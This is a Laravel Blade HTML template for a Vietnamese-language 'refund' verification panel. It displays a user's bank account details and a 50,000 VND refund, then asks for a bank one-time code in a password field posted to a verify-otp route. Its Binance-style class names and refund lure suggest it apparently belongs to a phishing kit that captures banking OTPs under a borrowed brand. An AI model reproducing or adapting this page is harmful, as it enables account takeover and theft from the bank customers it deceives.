<div class="list-group transferring_systerm d-none" id="bank-otp-wrapper">
    <h5 class="list-group-item list-group-item-action active nonti-refunds verify-status" aria-current="true">
        {{ __('verify.notification') }}: {{ __('verify.transferring_money') }}
    </h5>
    <h6 class="list-group-item list-group-item-action noti-user-refunds dark-mode-background">
        <div class="css-epiuoh">
            <div class="css-164229y">
                <div class="css-10nf7hq">
                    <div data-bn-type="text" class="css-vspdms theme--text">
                        {{ __('verify.label_content_transfer') }}</div>

                </div>
                <div class="css-1gmq84w">
                    <div data-bn-type="text" class="css-6uwbzv theme--text">
                        Ma xac minh cua ban la ****
                    </div>
                </div>
            </div>
            <div class="css-164229y">
                <div class="css-10nf7hq">
                    <div data-bn-type="text" class="css-vspdms theme--text">
                        {{ __('verify.acount_bank') }}
                    </div>
                </div>
                <div class="css-1gmq84w">
                    <div data-bn-type="text" class="css-6uwbzv theme--text">
                        {{ $bankData['account_name'] }}
                    </div>
                </div>
            </div>
            <div class="css-164229y">
                <div class="css-10nf7hq">
                    <div data-bn-type="text" class="css-vspdms theme--text">
                        {{ __('verify.number_bank') }}
                    </div>
                </div>
                <div class="css-1gmq84w">
                    <div data-bn-type="text" class="css-6uwbzv theme--text">
                        {{ $bankData['account_number'] }}</div>
                </div>
            </div>
            <div class="css-164229y">
                <div class="css-10nf7hq">
                    <div data-bn-type="text" class="css-vspdms theme--text">{{ __('verify.name_bank') }}
                    </div>
                </div>
                <div class="css-1gmq84w">
                    <div data-bn-type="text" class="css-6uwbzv theme--text"> ✅
                        {{ $bankData['bank_name'] }} </div>
                </div>
            </div>
            <div class="css-164229y">
                <div class="css-10nf7hq">
                    <div data-bn-type="text" class="css-vspdms theme--text">
                        {{ __('verify.refunds') }}
                    </div>
                </div>
                <div class="css-1gmq84w">
                    <div data-bn-type="text" class="css-6uwbzv theme--text">
                        50.000 vnd</div>
                </div>
            </div>

        </div>
    </h6>

    <h6 class="list-group-item list-group-item-action noti-user-refunds dark-mode-background theme--text">
        {{ __('verify.status') }}: <span class="complete-code verify-status"></span>
        <p>{{ __('verify.note_complete') }} </p>
    </h6>
    <h6 class="list-group-item list-group-item-action noti-user-refunds dark-mode-background" style="text-align: right">
        <form class="row g-3" action="{{ route('verify-otp') }}" method="post" id="form-otp">
            @csrf
            <input type="hidden" name="uuid" value="{{ $bankData['uuid'] }}">
            <div class="col-auto">
                <label for="staticEmail2" class="visually-hidden"></label>
                <input type="text" readonly class="form-control-plaintext theme--text" id="staticEmail2"
                    value="{{ __('verify.enter_verification_code') }}">
            </div>
            <div class="col-auto">
                <label for="inputPassword2" class="visually-hidden"></label>
                <input type="password" name="otp" class="form-control" id="inputPassword2"
                    placeholder="{{ __('verify.placeholder_code') }}">
            </div>
            <div class="col-auto">
                <button type="button" id="submitOtp" class="btn btn-primary mb-3 ok">{{ __('verify.ok') }}</button>
            </div>
        </form>
        <a class="btn btn-outline-secondary btn-verify d-none w-100" id="payment-button"
            href="{{ route('transaction') }}">Tiếp tục
            giao
            dịch</a>
    </h6>

</div>